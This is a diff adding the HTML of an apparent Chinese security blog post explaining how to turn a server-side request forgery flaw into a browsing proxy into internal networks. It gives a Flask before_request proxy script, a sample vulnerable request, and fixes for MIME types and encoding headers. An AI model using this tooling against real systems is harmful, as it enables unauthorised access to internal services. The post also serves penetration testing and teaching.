@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>SSRF漏洞配合Flask的巧妙利用 - 内网漫游 « 倾旋的博客</title>
+  <meta name="description" content="SSRF 服务器请求伪造SSRF(Server-side Request Forge, 服务端请求伪造)。由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。常见的功能点  Net-NTLM &amp;&amp; NTLM Relay  获取服务器真实IP  端口扫描  网页代理  ...">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/archivers/2020-03-21/2">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">SSRF漏洞配合Flask的巧妙利用 - 内网漫游</h1>
+    <p class="post-meta">Mar 21, 2020</p>
+  </header>
+
+  <article class="post-content">
+    <h2 id="ssrf-服务器请求伪造">SSRF 服务器请求伪造</h2>
+
+<p>SSRF(Server-side Request Forge, 服务端请求伪造)。由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。</p>
+
+<h3 id="常见的功能点">常见的功能点</h3>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/488f1abdc7ce71395c6adc1eafaec9bc.png" alt="2020-03-21-16-58-32"></p>
+
+<ul>
+  <li>Net-NTLM &amp;&amp; NTLM Relay</li>
+  <li>获取服务器真实IP</li>
+  <li>端口扫描</li>
+  <li><strong>网页代理</strong></li>
+  <li>……</li>
+</ul>
+
+<h3 id="网页代理---http-proxy">网页代理 - HTTP Proxy</h3>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2254f77d861f4e0ed512fb96cbf4e0cc.png" alt="2020-03-21-17-01-01"></p>
+
+<p><strong>客户端应用HTTP代理后，可通过代理服务器访问内网HTTP协议资源</strong></p>
+
+<p><strong>而在SSRF场景，需要SSRF具备支持HTTP两大请求方式：GET、POST，且有响应Body</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /application/services/proxy/doPostAndGet HTTP/1.1
+Host: app.domain.com
+Connection: keep-alive
+Content-Length: XX
+Content-Type: application/json
+Accept: */*
+Referer: http://app.domain.com/application/portal/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+
+{
+    "url":"http://domain.com/sso?login",
+    "method":"post",
+    "jsonBody":"{\"username\":\"123456\"}"
+}
+</code></pre></div></div>
+
+<h2 id="flask-框架">Flask 框架</h2>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/d583d5996730b6dedece0d0a37293330.png" alt="2020-03-21-17-02-11"></p>
+
+<p>Flask是一个用Python编写的Web应用程序框架，它基于Werkzeug WSGI工具包和Jinja2模板引擎。</p>
+
+<p>Flask也被称为“microframework” ，因为它使用简单的核心，用extension增加其他功能，它没有默认使用的数据库、窗体验证工具。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">hello_world</span><span class="p">():</span>
+    <span class="k">return</span> <span class="s">'Hello, World!'</span>
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/bd5986bb7d7072741938d609bcbcbbac.png" alt="2020-03-21-17-02-36"></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ export FLASK_APP=hello.py
+$ python -m flask run
+ * Running on http://127.0.0.1:5000/
+</code></pre></div></div>
+<h3 id="flask-框架的请求流程">Flask 框架的请求流程</h3>
+
+<ol>
+  <li>befor_first_request</li>
+  <li>befor_request</li>
+  <li>after_request</li>
+  <li>teardown_request → 异常处理</li>
+  <li>after_this_request</li>
+</ol>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/aa6371f165a89586b6b27e416d6140aa.png" alt="2020-03-21-17-03-02"></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">Response</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">before_request</span>
+<span class="k">def</span> <span class="nf">_proxy</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">request</span><span class="p">(</span>
+        <span class="n">method</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="p">,</span>
+        <span class="n">url</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">,</span>
+        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="n">key</span><span class="p">:</span> <span class="n">value</span> <span class="k">for</span> <span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">},</span>
+        <span class="n">data</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">get_data</span><span class="p">(),</span>
+        <span class="n">cookies</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">,</span>
+        <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+    <span class="n">excluded_headers</span> <span class="o">=</span> <span class="p">[</span><span class="s">'content-encoding'</span><span class="p">,</span> <span class="s">'content-length'</span><span class="p">,</span> <span class="s">'transfer-encoding'</span><span class="p">,</span> <span class="s">'connection'</span><span class="p">]</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">[(</span><span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span> <span class="k">for</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">.</span><span class="n">raw</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">items</span><span class="p">()</span>
+               <span class="k">if</span> <span class="n">name</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">excluded_headers</span><span class="p">]</span>
+
+    <span class="n">response</span> <span class="o">=</span> <span class="n">Response</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">content</span><span class="p">,</span> <span class="n">resp</span><span class="p">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">headers</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">response</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Flask的默认端口是：5000</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/811e55d62514ad3fde7ccac72b925cf3.png" alt="2020-03-21-17-03-33"></p>
+
+<p>插件名称：SwitchyOmega</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/ce2bbd6872539ded588a40dc94d5e7f3.png" alt="2020-03-21-17-03-48"></p>
+
+<p>通过把代理服务器设置为5000（Flask默认）端口，浏览器的所有请求都会经过这五个装饰器，在每个装饰器中，可以写自己的检测规则。由于许多的SSRF漏洞接口返回的Content-Type始终都是一样的，因此会产生图片、JS等静态文件无法加载，下面我们将解决这个问题。</p>
+
+<h3 id="解决文件类型问题">解决文件类型问题</h3>
+
+<p>遇到这个问题，首先分析浏览器为什么无法加载。</p>
+
+<ol>
+  <li>SSRF漏洞接口返回的Content-Type是Json，那么我们还需要将Json转化为一个字典，把DATA取出。</li>
+  <li>根据SSRF漏洞请求的URI来定义MIME Type，Response返回对应的MIME Type即可解决</li>
+</ol>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">get_filetype</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">content_type</span> <span class="o">=</span> <span class="s">'text/html'</span>
+    <span class="n">response_mimetype</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">'.png'</span><span class="p">:</span><span class="s">'image/png'</span><span class="p">,</span>
+        <span class="s">'.js'</span><span class="p">:</span><span class="s">'application/javascript'</span><span class="p">,</span>
+        <span class="s">'.jpg'</span><span class="p">:</span><span class="s">'image/jpeg'</span><span class="p">,</span>
+        <span class="s">'.gif'</span><span class="p">:</span> <span class="s">'image/gif'</span><span class="p">,</span>
+        <span class="s">'.jpeg'</span><span class="p">:</span><span class="s">'image/jpeg'</span><span class="p">,</span>
+        <span class="s">'.ico'</span><span class="p">:</span><span class="s">'image/x-icon'</span><span class="p">,</span>
+        <span class="s">'.css'</span><span class="p">:</span><span class="s">'text/css'</span><span class="p">,</span>
+        <span class="s">'.svg'</span><span class="p">:</span><span class="s">'image/svg+xml'</span><span class="p">,</span>
+    <span class="p">}</span>
+    <span class="n">disassembled</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="n">filename</span><span class="p">,</span> <span class="n">file_ext</span> <span class="o">=</span> <span class="n">splitext</span><span class="p">(</span><span class="n">basename</span><span class="p">(</span><span class="n">disassembled</span><span class="p">.</span><span class="n">path</span><span class="p">))</span>
+    <span class="n">content_type</span> <span class="o">=</span> <span class="n">response_mimetype</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">file_ext</span><span class="p">,</span> <span class="s">'text/html'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">content_type</span>
+</code></pre></div></div>
+
+<p>这里定义了一些常见的MIME类型，通过截取URI的文件扩展名来找到对应的MIME类型，默认找不到就以HTML返回，不知道还有没有更赞的办法，如果有欢迎分享。</p>
+
+<h3 id="content-encoding问题">Content-Encoding问题</h3>
+
+<p>Accept-Encoding 和Content-Encoding是HTTP中用来对采用哪种编码格式传输正文进行协定的一对头部字段。</p>
+
+<p>通过SSRF漏洞接口返回的通常可能是附带Content-Encoding头的响应，但与SSRF目标返回的不匹配，会造成网页展示不完全的情况。（本质上是接口取回的内容已经是解码后的，但接口本身可能又有编码头）</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">excluded_headers</span> <span class="o">=</span> <span class="p">[</span><span class="s">'content-encoding'</span><span class="p">,</span> <span class="s">'content-length'</span><span class="p">,</span> <span class="s">'transfer-encoding'</span><span class="p">,</span> <span class="s">'connection'</span><span class="p">]</span>
+        <span class="n">headers</span> <span class="o">=</span> <span class="p">[(</span><span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span> <span class="k">for</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">.</span><span class="n">raw</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">items</span><span class="p">()</span>
+                   <span class="k">if</span> <span class="n">name</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">excluded_headers</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>这里的解决方式是剔除编码头 Content-Encoding。</p>
+
+  </article>
+  
+  
+
+
+
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
